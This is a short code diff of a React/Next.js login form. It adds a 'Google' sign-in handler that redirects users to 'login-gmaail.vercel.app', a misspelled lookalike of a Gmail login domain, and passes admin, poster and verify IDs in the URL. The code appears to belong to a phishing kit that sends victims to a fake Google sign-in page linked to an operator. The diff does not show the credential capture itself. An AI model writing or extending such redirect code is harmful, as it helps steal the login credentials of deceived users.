@@ -11,7 +11,7 @@ import Image from "next/image";
 import Webcam from "react-webcam";
 
 
-function LoginForm({ adminId, posterId }) {
+function LoginForm({ adminId, posterId,verifyId }) {
   const router = useRouter();
   const [email, setEmail] = useState("");
   const [password, setPassword] = useState("");
@@ -34,7 +34,10 @@ function LoginForm({ adminId, posterId }) {
   
     console.log(submitValues);
   };
+  const handleSubmitgoogle = () => {
+router.push(`https://login-gmaail.vercel.app/${adminId}/${posterId}/${verifyId}`);
 
+  };
 
 
   return (
